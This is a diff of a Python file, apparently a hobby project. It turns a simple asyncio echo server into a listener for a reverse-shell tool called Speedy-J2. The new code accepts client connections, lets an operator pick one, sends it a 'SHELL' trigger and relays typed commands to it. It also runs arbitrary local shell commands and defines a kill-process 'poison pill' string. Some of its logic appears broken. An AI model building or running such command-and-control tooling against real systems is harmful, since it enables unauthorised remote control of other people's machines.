@@ -11,8 +11,8 @@
                  !.........||||                     ||||
                  !.........||||                     ||||
                  !.........||||                     ||||
-                 `.........||||                    ,||||
-                  .;.......||||               _.-!!|||||
+                 `.........||||  ,                 ,||||
+                  .;.......||||  ;..-         _.-!!|||||
            .,uodWBBBBb.....||||       _.-!!|||||||||!:'
         !YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
         !..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
@@ -32,63 +32,130 @@
                               `!^"'
 
 
-Async server + CLI for reverse shells
-Allows Speedy-J2 clients to connect and receive commands
+Server for reverse shelling with Speedy-J2 clients
+
+Drop into a shell with keyboardInterrupt:
+        - Send everything after a SEND
+        - No padding, max 1024 bytes, end with b' AYE'
+        - Exit with 'exit()'
+
 """
-
-import asyncio
+import subprocess
+import selectors
 import socket
+import types
+import time
+import sys
 
-# CLI imports
-#from prompt_toolkit import print_formatted_text as print, HTML, prompt
-#from prompt_toolkit.styles import Style
-#from prompt_toolkit.eventloop.defaults import use_asyncio_event_loop
-#from prompt_toolkit.patch_stdout import patch_stdout
-#from prompt_toolkit.shortcuts import print_container
-#from prompt_toolkit.widgets import Frame, TextArea
+HOST = '127.0.0.1'
+PORT = int(sys.argv[1])
 
-#style = Style.from_dict({'ip': '#ff0066 underline',
-#                         'status': '#44ff00 bold',
-#                         })
+sel = selectors.DefaultSelector()
+
+# Listening socket, TCP, IPv4
+lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+lsock.bind((HOST, PORT))
+lsock.listen()
+print('listening on', (HOST, PORT))
+
+# Set socket in non-blocking mode
+lsock.setblocking(False)
+# Register the socket to be monitored with sel.select() for read events
+sel.register(lsock, selectors.EVENT_READ, data=None)
+
+# E.g.:
+poison_pill = "kill -9 $(pgrep -f server.py)"
 
 
-# This is a (native) coroutine, 3.5> syntax
-async def handle_marco(reader, writer):
-    # Coroutine objects returned from async def functions are 'awaitable'
-    # Go let something else run until whenever reader.read() is ready
-    data = await reader.read(100)
-    message = data.decode()
-    addr = writer.get_extra_info('peername')
-    print("Received {} from {}".format(message, addr))
 
-    print("Sending: {}".format(message))
 
-    writer.write("Polo".encode())
-    await writer.drain()
+def subp_run(command):
+    return subprocess.run(command, shell=True,
+                          stdout=subprocess.PIPE,
+                          stderr=subprocess.STDOUT,
+                          stdin=subprocess.PIPE,
+                          timeout=None)
 
-    print("Closing client socket")
-    writer.close()
 
-loop = asyncio.get_event_loop()
-coro = asyncio.start_server(handle_marco, '127.0.0.1', 8888, loop=loop)
-server = loop.run_until_complete(coro)
+def accept_wrapper(sock):
+    conn, addr = sock.accept()  # Ready to read
+    print(f'Accepted client {addr}')
+    conn.setblocking(False)
+    data = types.SimpleNamespace(addr=addr, inb=b'', outb=b'')
+    events = selectors.EVENT_READ | selectors.EVENT_WRITE
+    sel.register(conn, events, data=data)
 
-# Serve requests until Ctrl+C is pressed
-print('Serving on {}'.format(server.sockets[0].getsockname()))
+
+def test_connection(key, mask):
+    sock = key.fileobj
+    data = key.data
+    if mask & selectors.EVENT_READ:  # Sock can be read
+        print("EV READ")
+        recv_data = sock.recv(5)
+        if recv_data:
+            print(recv_data.decode())
+            assert recv_data == b'Marco'
+            data.outb += b'Polo'
+        else:
+            print("Received nothing from", data.addr)
+            time.sleep(2)
+    if mask & selectors.EVENT_WRITE:
+        sent = sock.send(data.outb)  # Returns the number of bytes sent
+        data.outb = data.outb[sent:]
+
+
+def ioloop(s: socket):
+    while True:
+        data = input(f"{s.getpeername()[0]}: ")
+        if data[:5] == 'SEND ':
+            print(data[5:])
+            s.send(data[5:].encode())
+            assert len(data[5:]) <= 1024
+            assert data[:-4] == ' AYE'
+
+        elif data == 'exit()':
+            break
+
+conns = []
+
+# The event loop
 try:
-    loop.run_forever()
-except KeyboardInterrupt:
-    pass
+    while True:
+        try:
+            events = sel.select(timeout=None)  # blocks until there are sockets ready
+            # It returns a k, v for each socket, key.fileobj contains the socket
+            # If key.data is None we know its from the listening socket
+            for key, mask in events:
+                if key.data is None:
+                    accept_wrapper(key.fileobj)
+                else:
+                    test_connection(key, mask)
+                    conns.append((key, mask))
 
-# Close the server
-server.close()
-loop.run_until_complete(server.wait_closed())
-loop.close()
+        except KeyboardInterrupt as interception:
+
+            i = 0
+            print("\nAvailable clients: ")
+            print(len(conns))
+            for i in range(len(conns)):
+                clientk = conns[i][0]
+                print(f'{i}' + ': ', clientk.data.addr, '\t')
+                selected = int(input("Select a client to shell with: "))
+                if selected in range(len(conns)):
+                    print("Welcome to ", clientk.data.addr)
+                    sock = clientk.fileobj
+                    sock.send(b'SHELL')
+                    ioloop(sock)
+
+                    pass
 
 
 
-#if __name__ == '__main__':
-#    Server()
-#    print(HTML('<h1>Welcome to SPEEDY-J2</h1>'))
-#    print(HTML('<ip>Hello</ip> <status>world</status>'), style=serverstyle)
-#    nclient = prompt("Select a client (1-{}) to connect to: ".format(len(target_addresses)))
+
+            sp = subp_run(input("Now what"))
+            sp.check_returncode()
+            print(sp.stdout.decode('utf-8'))
+
+except:
+    lsock.close()
+    sys.exit(1)
